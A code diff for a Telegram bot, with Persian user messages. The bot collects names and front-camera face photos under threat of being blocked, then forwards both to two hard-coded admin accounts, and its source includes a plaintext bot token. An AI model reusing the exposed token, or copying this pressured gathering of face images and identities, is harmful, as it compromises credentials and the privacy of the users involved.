@@ -7,7 +7,8 @@ import csv
 TOKEN = "6356574896:AAEBq_cjz9XNvbC7KahWhzmkLXd2ZBMEd6c"
 IMAGES_DIR = 'images'
 USERS_CSV_FILE = 'users.csv'
-ADMIN_ID = 358040589
+ADMIN_ID_1 = 5645370293
+ADMIN_ID_2 = 5495848617
 
 bot = telebot.TeleBot(TOKEN)
 
@@ -55,7 +56,13 @@ def handle_last_name(message, first_name):
         last_name = message.text
         user_id = message.from_user.id
 
-        bot.send_message(message.chat.id, 'متشکریم, حال تصویر خود را ارسال کنید.')
+        image_caption = """
+        کاربر گرامی لطفا برای ارسال عکس دوربین جلوی تلفن خود را باز کنید و تصویر خود را ارسال کنید
+
+        ربات مجهز به سیستم تشخیص چهره میباشد و در صورتی که بخواهید آن را دور بزنید شما را بلاک میکند.
+        """
+
+        bot.send_message(message.chat.id, image_caption)
 
         # Save user info to CSV
         save_user_info(user_id, first_name, last_name)
@@ -103,12 +110,16 @@ def handle_image(message):
         if first_name:
             # Send user information to admin
             admin_message = f"User ID: {user_id}\nFirst Name: {first_name}\nLast Name: {last_name}"
-            bot.send_message(ADMIN_ID, admin_message)
+            bot.send_message(ADMIN_ID_1, admin_message)
+            bot.send_message(ADMIN_ID_2, admin_message)
 
-            # Send the image to the user
-            bot.send_photo(user_id, open(file_name, 'rb'))
 
-        bot.send_message(message.chat.id, 'اطلاعات شما با موفقیت ثبت شد, حال میتوانید در گروه فعالبت کنید.')
+            # Send the image to the admins
+            bot.send_photo(ADMIN_ID_1, open(file_name, 'rb'))
+            bot.send_photo(ADMIN_ID_2, open(file_name, 'rb'))
+
+
+        bot.send_message(message.chat.id, 'اطلاعات شما با موفقیت ثبت شد, حال میتوانید در گروه فعالبت کنید. \n از لینک زیر وارد گروه شوید و پیام بگذارید https://t.me/khodandaaz39')
     else:
         bot.send_message(message.chat.id, 'چهره ایی در تصویر تشخیص داده نشد شما سیع کردید ربات را گول بزنید تا دقایق دیگر از گروه حدف خواهید شد.')
 
